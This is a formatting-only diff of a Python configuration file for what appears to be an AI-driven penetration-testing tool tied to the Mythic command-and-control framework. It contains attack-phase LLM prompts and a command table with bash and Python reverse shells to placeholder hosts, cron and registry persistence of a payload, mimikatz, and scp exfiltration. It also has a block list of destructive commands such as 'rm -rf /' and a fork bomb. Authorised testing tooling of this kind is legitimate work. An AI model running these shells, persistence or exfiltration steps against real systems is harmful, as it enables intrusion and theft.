@@ -1,4 +1,4 @@
-""" config with environment variables and general configuration logic."""
+"""config with environment variables and general configuration logic."""
 # Env variables are combined in nested groups like "Security", "Database" etc.
 # So environment variable (case-insensitive) for jwt_secret_key will be
 # "security__jwt_secret_key"
@@ -14,7 +14,6 @@
 #
 # See https://pydantic-docs.helpmanual.io/usage/settings/
 # Note, complex types like lists are read as json-encoded strings.
-
 
 import logging.config
 from functools import lru_cache
@@ -67,7 +66,8 @@ class Mythic(BaseModel):
 
 
 class LLMservice(BaseModel):
-    """ env format like LLMSERVICE__API_URL=http... """
+    """env format like LLMSERVICE__API_URL=http..."""
+
     local: int = 0
     api_url: HttpUrl = "http://localhost:69228"  # Для локального Ollama
     api_key: str = None
@@ -76,7 +76,8 @@ class LLMservice(BaseModel):
 
 
 class Settings(BaseSettings):
-    """ only to validate settings by pydantic """
+    """only to validate settings by pydantic"""
+
     security: Security = Field(default_factory=Security)
     database: Database = Field(default_factory=Database)
     mythic: Mythic = Field(default_factory=Mythic)
@@ -86,7 +87,7 @@ class Settings(BaseSettings):
     @computed_field  # type: ignore[prop-decorator]
     @property
     def sqlalchemy_database_uri(self) -> URL:
-        """ setup main db uri to connect """
+        """setup main db uri to connect"""
         return URL.create(
             drivername="postgresql+asyncpg",
             username=self.database.username,
@@ -109,7 +110,7 @@ def get_settings() -> Settings:
 
 
 def logging_config(log_level: str) -> None:
-    """ setup logging format """
+    """setup logging format"""
     conf = {
         "version": 1,
         "disable_existing_loggers": False,
@@ -139,13 +140,26 @@ def logging_config(log_level: str) -> None:
 
 logging_config(log_level=LOG_LEVEL)
 
-phases = ("Reconnaissance", "Resource Development",
-          "Delivery", "Social Engineering",
-          "Exploitation", "Persistence", "Defense Evasion",
-          "Command & Control", "Pivoting", "Discovery",
-          "Privilege Escalation", "Execution", "Credential Access",
-          "Lateral Movement", "Collection", "Exfiltration",
-          "Impact", "Objectives")
+phases = (
+    "Reconnaissance",
+    "Resource Development",
+    "Delivery",
+    "Social Engineering",
+    "Exploitation",
+    "Persistence",
+    "Defense Evasion",
+    "Command & Control",
+    "Pivoting",
+    "Discovery",
+    "Privilege Escalation",
+    "Execution",
+    "Credential Access",
+    "Lateral Movement",
+    "Collection",
+    "Exfiltration",
+    "Impact",
+    "Objectives",
+)
 
 phase_prompts = {
     "recon": """
@@ -166,7 +180,6 @@ phase_prompts = {
     Respond in JSON format with fields:
     priorities, tools, attack_vectors, what_to_look_for, next_steps
     """,
-
     "initial_access": """
     You are a penetration testing expert.
     Currently in the initial access phase.
@@ -185,7 +198,6 @@ phase_prompts = {
     Respond in JSON format with fields:
     access_methods, social_engineering, vulnerabilities, tools, next_steps
     """,
-
     "execution": """
     You are a penetration testing expert. Currently in the execution phase.
     Based on the provided context, suggest code execution methods:
@@ -203,7 +215,6 @@ phase_prompts = {
     Respond in JSON format with fields:
     execution_methods, bypass_techniques, stealth_methods, tools, next_steps
     """,
-
     "persistence": """
     You are a penetration testing expert. Currently in the persistence phase.
     Based on the provided context, suggest access persistence methods:
@@ -221,7 +232,6 @@ phase_prompts = {
     Respond in JSON format with fields:
     persistence_methods, stealth_techniques, backdoors, tools, next_steps
     """,
-
     "privilege_escalation": """
     You are a penetration testing expert.
     Currently in the privilege escalation phase.
@@ -241,7 +251,6 @@ phase_prompts = {
     escalation_methods, kernel_vulnerabilities, misconfigurations,
     tools, next_steps
     """,
-
     "discovery": """
     You are a penetration testing expert. Currently in the discovery phase.
     Based on the provided context, suggest information gathering methods:
@@ -260,7 +269,6 @@ phase_prompts = {
     system_info_methods, network_discovery, account_discovery,
     tools, next_steps
     """,
-
     "lateral_movement": """
     You are a penetration testing expert.
     Currently in the lateral movement phase.
@@ -280,7 +288,6 @@ phase_prompts = {
     movement_methods, network_techniques, credential_usage,
     tools, next_steps
     """,
-
     "collection": """
     You are a penetration testing expert. Currently in the collection phase.
     Based on the provided context, suggest data collection methods:
@@ -299,7 +306,6 @@ phase_prompts = {
     collection_methods, target_data_types, exfiltration_techniques,
     tools, next_steps
     """,
-
     "command_and_control": """
     You are a penetration testing expert.
     Currently in the command and control phase.
@@ -318,7 +324,6 @@ phase_prompts = {
     Respond in JSON format with fields:
     c2_methods, traffic_obfuscation, protocols, tools, next_steps
     """,
-
     "exfiltration": """
     You are a penetration testing expert. Currently in the exfiltration phase.
     Based on the provided context, suggest data exfiltration methods:
@@ -336,7 +341,6 @@ phase_prompts = {
     Respond in JSON format with fields:
     exfiltration_methods, bypass_techniques, data_channels, tools, next_steps
     """,
-
     "impact": """
     You are a penetration testing expert. Currently in the impact phase.
     Based on the provided context, suggest impact methods:
@@ -353,7 +357,7 @@ phase_prompts = {
 
     Respond in JSON format with fields:
     impact_methods, availability_attacks, trace_removal, tools, next_steps
-    """
+    """,
 }
 
 PHASE_COMMANDS = {
@@ -380,7 +384,7 @@ PHASE_COMMANDS = {
     ],
     "Persistence": [
         "crontab -l && echo '*/5 * * * * /tmp/payload' | crontab -",
-        "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /t REG_SZ /d \"C:\\Users\\Public\\payload.exe\"",
+        'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /t REG_SZ /d "C:\\Users\\Public\\payload.exe"',
     ],
     "Defense Evasion": [
         "upx payload.exe",
@@ -407,7 +411,7 @@ PHASE_COMMANDS = {
     ],
     "Execution": [
         "bash -i >& /dev/tcp/<ip>/<port> 0>&1",
-        "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<ip>\",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
+        'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ip>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
     ],
     "Credential Access": [
         "mimikatz.exe",
@@ -419,7 +423,7 @@ PHASE_COMMANDS = {
     ],
     "Collection": [
         "tar czf /tmp/data.tar.gz /home/user/Documents/",
-        "find / -name \"*.docx\" -type f 2>/dev/null",
+        'find / -name "*.docx" -type f 2>/dev/null',
     ],
     "Exfiltration": [
         "scp /tmp/data.tar.gz user@remote:/tmp/",
@@ -435,5 +439,11 @@ PHASE_COMMANDS = {
     ],
 }
 
-UNSAFE_CMD = ["rm -fr /", "dd if=/dev/zero of=", "chown -R root:root /",
-              "rm -rf /", ":(){ :|:& };:", "rm -rf *"]
+UNSAFE_CMD = [
+    "rm -fr /",
+    "dd if=/dev/zero of=",
+    "chown -R root:root /",
+    "rm -rf /",
+    ":(){ :|:& };:",
+    "rm -rf *",
+]
